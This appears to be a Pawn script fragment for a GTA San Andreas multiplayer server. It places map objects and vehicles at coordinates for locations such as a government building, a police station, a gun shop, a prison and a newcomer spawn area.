CreateDynamicObject(19121, 1090.64001, -1702.00000, 13.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3578, 1085.02295, -1702.08447, 11.91000,   0.00000, 0.00000, 0.10000);
CreateDynamicObject(3578, 1102.42004, -1702.00000, 11.91000,   0.00000, 0.00000, 0.10000);
CreateDynamicObject(973, 1090.34998, -1696.94995, 13.38000,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(973, 1097.07996, -1696.93994, 13.38000,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(19121, 1090.59998, -1691.84998, 13.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(640, 1092.81006, -1691.87000, 13.23000,   0.00000, 0.00000, -89.90000);
CreateDynamicObject(19121, 1096.92004, -1691.89001, 13.50000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(638, 1095.93994, -1691.87000, 13.25000,   0.00000, 0.00000, -89.90000);
//

// Regierung by CoL Team
CreateDynamicObject(3928, 1116.22705, -2056.05176, 73.44313,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, 1115.71082, -2018.87170, 73.44313,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1111.83630, -2015.56079, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1119.43677, -2015.54749, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1111.81409, -2022.39880, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1119.45630, -2022.40527, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1119.97302, -2052.71777, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1112.29712, -2052.75342, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1112.25403, -2059.55371, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1119.98328, -2059.48608, 73.32674,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10832, 1281.09082, -2046.52246, 59.61003,   0.00000, 2.73180, -0.90000);
CreateDynamicObject(7665, 1255.95093, -2025.71387, 59.89101,   0.00000, 1.82120, 0.00000);
CreateDynamicObject(9339, 1197.37769, -2003.13403, 68.21466,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9339, 1171.27979, -2003.12842, 68.21466,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9339, 1150.25244, -2003.13318, 68.21289,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9339, 1197.34790, -2071.11206, 68.21289,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9339, 1171.28442, -2071.10400, 68.21289,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(9339, 1150.26892, -2071.10864, 68.21289,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(982, 1210.74048, -2020.64893, 68.69621,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(982, 1210.72253, -2053.48633, 68.69621,   0.00000, 0.00000, 0.00000);

// Ammunation Los Santos
CreateDynamicObject(17521, 1365.99451, -1279.40552, 22.78778,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(17521, 1366.03027, -1279.38904, 18.59041,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(17521, 1366.08716, -1279.28394, 15.87522,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1532, 1365.02417, -1265.62817, 12.48524,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(14902, 1379.91772, -1288.42651, 13.04458,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(646, 1364.14661, -1271.32104, 13.96340,   0.00000, 0.00000, 326.25000);
CreateDynamicObject(646, 1364.29028, -1274.69336, 13.96340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(646, 1364.10132, -1282.21301, 13.96340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(646, 1364.22583, -1285.49536, 13.96340,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1532, 1365.03137, -1291.39319, 12.49072,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(1280, 1364.79126, -1273.23816, 12.94823,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1280, 1364.66040, -1283.96680, 12.94823,   0.00000, 0.00000, 0.00000);



// LSPD Tür
CreateDynamicObject(19313, 1577.38647, -1638.13672, 12.31839,   0.00000, 0.00000, 0.00000);


// Knast
CreateDynamicObject(19303, 266.33142, 87.48125, 1001.29376,   0.00000, 0.00000, 89.99998);
CreateDynamicObject(19303, 266.33856, 82.95472, 1001.29376,   0.00000, 0.00000, 89.99998);

// LSPD Tor Drinne
lspdtor = CreateDynamicObject(19325, 246.44479, 72.60710, 1004.67303,   0.00000, 0.00000, -89.99995, -1, -1, -1, 250.0);
/*
// Autoscooter
CreateDynamicObject(987, 1448.67334, -1724.75598, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1436.79858, -1724.74304, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1460.58289, -1724.80811, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1475.45544, -1724.72620, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1484.41675, -1724.74048, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1496.32031, -1724.72607, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1508.18896, -1724.69727, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1520.26367, -1724.83679, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.27539, -1712.95435, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.24231, -1701.05469, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.26270, -1689.14441, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.26636, -1677.25806, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.25134, -1665.36499, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.23511, -1653.45996, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.21790, -1641.52026, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.22192, -1629.60840, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.22119, -1617.73425, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1520.21887, -1611.73315, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(19129, 1465.42065, -1657.43787, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19129, 1484.88379, -1657.43445, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19129, 1484.90442, -1637.80798, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19129, 1465.41467, -1637.69812, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19129, 1465.39807, -1676.93591, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19129, 1484.86426, -1676.91956, 14.29282,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1465.17444, -1677.08533, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1465.15356, -1657.22266, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1465.18945, -1637.26831, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1485.08728, -1657.15881, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1485.08887, -1677.08521, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18769, 1485.11060, -1637.33130, 20.53962,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1494.35999, -1628.18994, 15.47631,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.79529, -1628.26636, 15.47631,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.84155, -1686.49182, 15.47631,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1494.48425, -1686.55188, 15.47631,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1494.49390, -1686.55798, 18.68307,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.82043, -1686.45264, 18.67600,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.75806, -1628.26843, 18.68464,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1494.37024, -1628.23059, 18.69865,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1488.95422, -1628.18372, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1479.02429, -1628.19226, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1469.11694, -1628.18909, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1461.15576, -1628.19751, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1455.80298, -1633.69226, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1455.82288, -1643.55273, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1455.82483, -1653.31323, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1455.80212, -1663.21338, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1455.79626, -1673.10876, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1455.81421, -1681.78979, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1461.20093, -1686.46375, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1471.06042, -1686.47449, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1480.93445, -1686.45251, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1489.35303, -1686.44995, 13.73055,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18766, 1494.47363, -1681.35742, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1494.45422, -1671.61414, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1494.45215, -1661.71082, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1494.47937, -1651.89050, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1494.49182, -1642.00391, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18766, 1494.49390, -1632.73254, 13.73055,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(18762, 1494.46143, -1647.23889, 18.69865,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19124, 1494.82788, -1627.74231, 21.53341,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19122, 1455.40613, -1627.61694, 21.53730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19122, 1455.40186, -1686.74341, 21.53730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19122, 1494.76135, -1686.73669, 21.53730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18102, 1479.65039, -1661.17944, 20.90536,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1508.42639, -1599.79810, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1496.51587, -1599.75342, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1484.59802, -1599.66638, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1472.69543, -1599.67358, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1460.75403, -1599.65161, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1448.83228, -1599.65747, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1437.10962, -1599.64929, 12.18785,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 1437.07410, -1611.49451, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.09644, -1623.42102, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.13379, -1635.34814, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.15796, -1647.27917, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.17847, -1659.18665, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.13904, -1671.10254, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.14246, -1683.01099, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.13135, -1694.97266, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.13013, -1706.89795, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.15076, -1718.80579, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(987, 1437.16431, -1724.80212, 12.18785,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1571, 1497.21118, -1634.27612, 14.14815,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6299, 1507.30750, -1615.06470, 15.02522,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(955, 1497.99121, -1662.03162, 13.38161,   0.00000, 0.00000, 181.07999);
CreateDynamicObject(3752, 1475.31897, -1700.86938, 15.54348,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6461, 1475.09753, -1704.53174, 25.91465,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6298, 1475.16589, -1704.38745, 25.90967,   0.00000, 0.00000, -90.00002);
CreateDynamicObject(3752, 1475.32190, -1708.06958, 15.54348,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.26074, -1695.00452, 19.68258,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.13733, -1693.20764, 23.07540,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.41760, -1711.26123, 17.06779,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.47900, -1715.90283, 23.50879,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.32507, -1716.14587, 27.28938,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.09937, -1715.49304, 30.29332,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.22705, -1713.95605, 33.41221,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.19873, -1711.43762, 35.90096,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.29041, -1707.82458, 37.90470,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.32568, -1704.42310, 38.32265,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.18945, -1700.68542, 37.78694,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.24133, -1697.64392, 36.23494,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.20044, -1695.10059, 33.70004,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.26575, -1693.21057, 30.24066,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.29358, -1692.72388, 26.48781,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3752, 1475.38770, -1704.42627, 14.94355,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6299, 1452.09607, -1713.62183, 15.02522,   0.00000, 0.00000, 179.15999);
CreateDynamicObject(2780, 1464.20520, -1650.73669, 20.49270,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(2780, 1485.45276, -1647.15527, 19.83626,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(2780, 1482.34814, -1673.99854, 20.49270,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(2780, 1469.80493, -1677.05383, 20.49270,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(18762, 1494.47290, -1667.08875, 18.69865,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.74561, -1667.12988, 18.69865,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1455.79395, -1647.28320, 18.69865,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2780, 1469.27661, -1647.20068, 19.83626,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(2780, 1468.30750, -1666.76404, 19.83626,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(2780, 1481.43591, -1666.69836, 19.83626,   25.95210, -3.66240, 0.00000);
CreateDynamicObject(18762, 1475.14441, -1628.14954, 18.68464,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18762, 1475.13708, -1686.48755, 18.68307,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(6299, 1504.34338, -1714.79529, 14.56400,   0.00000, 0.00000, 270.23999);

CreateVehicle(539, 1457.9789, -1631.4518, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1460.9247, -1631.2456, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1464.4597, -1631.4294, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1467.9625, -1631.5063, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1471.5350, -1631.5532, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1475.2708, -1631.8203, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1479.1831, -1631.4845, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1483.3206, -1631.7968, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1487.7781, -1631.7102, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1491.8230, -1631.7698, 14.7525, 180.7800, -1, -1, 100);
CreateVehicle(539, 1492.4070, -1683.5743, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1489.0540, -1683.5347, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1485.7821, -1683.5792, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1482.3260, -1683.5287, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1478.5178, -1683.4828, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1474.5280, -1683.5299, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1470.3920, -1683.5020, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1466.1962, -1683.3080, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1462.5765, -1683.4144, 14.6274, 0.0000, -1, -1, 100);
CreateVehicle(539, 1458.5955, -1683.3988, 14.6274, 0.0000, -1, -1, 100);
//

*/

// Noobspawn by CoL Team
CreateDynamicObject(970, 855.28162, -1684.66614, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 859.44611, -1684.64087, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 863.54755, -1684.60681, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 867.63666, -1684.62476, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 871.73663, -1684.66479, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 875.80951, -1684.67407, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 879.91364, -1684.63391, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 884.01477, -1684.64514, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 888.10956, -1684.63647, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 892.19916, -1684.60547, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 896.29156, -1684.61377, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 900.38531, -1684.62329, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 904.52167, -1684.59351, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 904.67334, -1645.51404, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 900.53021, -1645.52063, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 896.38757, -1645.50269, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 892.26495, -1645.48804, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 888.13794, -1645.48816, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 884.01227, -1645.50049, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 879.86926, -1645.50745, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 875.74664, -1645.52527, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 871.66418, -1645.54175, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 867.54181, -1645.55933, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 863.40118, -1645.57996, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 859.25989, -1645.58081, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 855.17987, -1645.58118, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 861.51306, -1670.45789, 13.03044,   0.00000, 0.00000, 89.99997);
CreateDynamicObject(970, 855.31805, -1672.55566, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 859.44653, -1672.54187, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 860.29053, -1666.53162, 13.03044,   0.00000, 0.00000, 89.99997);
CreateDynamicObject(970, 860.30035, -1662.39392, 13.03044,   0.00000, 0.00000, 89.99997);
CreateDynamicObject(970, 861.50177, -1658.09448, 13.03044,   0.00000, 0.00000, 89.99997);
CreateDynamicObject(970, 859.42743, -1656.02600, 13.03044,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(970, 855.27985, -1656.02771, 13.03044,   0.00000, 0.00000, 0.00000);
//

// Prison
CreateDynamicObject(19799, 2145.16797, 1627.13940, 994.26367,   0.00000, 0.00000, 0.00000);

// LSPD by CoL Team
CreateDynamicObject(1215, 1537.80005, -1622.19995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1536.29980, -1621.19922, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1535.30005, -1619.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1534.80005, -1618.00000, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1537.69995, -1633.59998, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1536.30005, -1634.59998, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1535.19995, -1636.30005, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1534.80005, -1637.80005, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1534.69995, -1605.50000, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1534.69995, -1611.50000, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1534.69995, -1614.69995, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1644.30005, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1657.09998, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1534.80005, -1663.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1715.90002, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1703.09998, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1690.30005, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(984, 1534.69995, -1688.69995, 13.20000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1534.80005, -1682.19995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1534.80005, -1681.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1537.50000, -1667.09998, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1537.50000, -1678.40002, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1535.59998, -1663.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1536.40002, -1663.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1537.30005, -1663.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1535.59998, -1681.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1536.40002, -1681.69995, 13.10000,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1537.09998, -1681.69995, 13.10000,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(11353, 1519.52319, -1675.57178, 16.93974,   0.00000, 0.00000, 0.00000);
//CreateDynamicObject(10932, 1538.82471, -1675.67810, 19.82895,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(983, 1539.74609, -1614.51465, 16.59595,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1539.74609, -1614.51465, 17.85256,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1539.73828, -1608.13879, 17.85256,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1539.75464, -1608.13428, 16.59595,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1539.73401, -1605.63257, 16.59595,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1539.73743, -1605.63757, 17.85256,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1542.92310, -1602.44177, 17.85256,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1542.92310, -1602.44177, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1549.31128, -1602.43665, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1549.30762, -1602.45715, 17.85256,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1555.67896, -1602.44727, 17.85256,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1555.69495, -1602.45044, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1562.05811, -1602.44446, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1562.06274, -1602.44214, 17.85256,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1568.44397, -1602.44861, 17.85256,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1568.45911, -1602.45056, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1574.87634, -1602.45776, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1574.87634, -1602.45776, 17.82692,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1581.26855, -1602.43457, 17.82692,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1581.22595, -1602.45117, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1587.61597, -1602.43884, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1587.64294, -1602.43018, 17.84066,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1594.01477, -1602.44263, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1594.01477, -1602.44263, 17.84389,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1600.39648, -1602.44800, 17.84389,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1600.39648, -1602.44800, 16.59011,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1604.81580, -1602.45984, 16.59011,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1604.81580, -1602.45984, 17.84363,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1608.00232, -1605.63977, 17.85256,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.00232, -1605.63977, 16.58507,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.01453, -1612.04663, 16.58507,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.01453, -1612.04663, 17.84013,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.03052, -1618.42908, 17.84013,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.03052, -1618.42908, 16.59889,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.02173, -1624.78210, 16.59889,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.02173, -1624.78210, 17.83036,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.00903, -1631.17017, 17.83036,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1608.00903, -1631.17017, 16.59179,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1607.99854, -1634.72729, 16.59179,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1607.99854, -1634.72729, 17.84569,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(983, 1604.80359, -1637.92029, 16.59011,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1604.80359, -1637.92029, 17.83995,   0.00000, 0.00000, -89.99996);
